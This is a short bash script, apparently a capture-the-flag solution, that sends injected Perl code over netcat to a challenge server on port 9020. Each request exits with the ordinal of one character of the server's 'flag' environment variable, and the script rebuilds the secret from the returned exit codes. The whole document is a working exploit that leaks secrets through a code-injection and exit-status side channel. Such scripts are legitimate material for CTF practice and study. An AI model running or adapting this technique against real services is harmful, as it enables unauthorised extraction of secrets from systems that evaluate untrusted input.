#!/bin/bash

for i in $(seq 0 30) ; do echo -n 'exit ord(substr($ENV{flag},'$i'))' | nc -N challenges.openctf.cat 9020 | grep 'Process exited' | awk '{print $3}' ; done | perl -ne 'print chr'
